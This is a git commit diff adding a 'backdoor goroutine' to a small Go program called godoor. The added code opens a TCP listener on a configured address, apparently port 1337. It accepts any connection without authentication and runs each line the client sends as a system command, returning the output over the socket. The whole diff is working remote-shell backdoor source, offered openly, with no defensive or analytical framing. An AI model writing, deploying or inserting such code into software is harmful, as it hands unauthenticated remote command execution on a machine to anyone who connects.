bd1a956aca7c0cd6c80812309de4a85be1e64255
Toni Korpela <toni@mussukka.org>
2014-08-10 15:12:33 +0300

    add backdoor goroutine to execute sent command

--- main.go
+++ main.go
@@ -2,29 +2,81 @@ package main
 
 import (
 	"fmt"
+	"log"
+	"net"
+	"strings"
+	"os/exec"
 	"io/ioutil"
 	"encoding/json"
+
 )
 
 type Configuration struct {
 	Socket string
-	Port string
+	Address string
+}
+
+func backdoor(connection net.Conn) bool {
+	defer connection.Close();
+	var buffer [512]byte
+	for {
+		n, err := connection.Read(buffer[0:])
+		if err != nil {
+			connection.Write([]byte(err.Error()))
+			return false;
+		}
+		packet := string(buffer[:n])
+		packet = strings.TrimSuffix(packet, "\n")
+		cmd := strings.Fields(packet);
+		if(len(cmd) >= 1) {
+			head := cmd[0];
+			parts := cmd[1:len(cmd)]
+			fmt.Printf("%s\r\n", packet);
+
+			if packet == "DISCONNECT" {
+				return true;
+			}
+
+			out, err := exec.Command(head, parts...).Output()
+			if err != nil {
+				newline := []byte("\n");
+				connection.Write(append([]byte(err.Error()), newline[:]...))
+			}
+			n, err = connection.Write(out)
+			if err != nil {
+				connection.Write([]byte(err.Error()))
+				return false;
+			}
+		}
+	}
 }
 
 func main() {
-	// { "Socket" : "tcp", "Port" : "1337" }
-	configuration, err := ioutil.ReadFile("godoor.conf")
+	// { "Socket" : "tcp", "Address" : ":1337" }
+	file, err := ioutil.ReadFile("godoor.conf")
 	if err != nil {
-		panic(err)
+		log.Fatal(err)
 	}
 
-	Conf := new(Configuration)
+	configuration := new(Configuration)
 
-	err = json.Unmarshal(configuration, Conf)
+	err = json.Unmarshal(file, configuration)
 	if err != nil {
-		panic(err)
+		log.Fatal(err)
 	}
 
-	//fmt.Printf("%+v", Conf);
+	listener, err := net.Listen(configuration.Socket, configuration.Address)
+	if err != nil {
+		log.Fatal(err)
+	}
 
+	defer listener.Close()
+
+	for {
+		connection, err := listener.Accept()
+		if err != nil {
+			log.Fatal(err)
+		}
+		go backdoor(connection);
+	}
 }
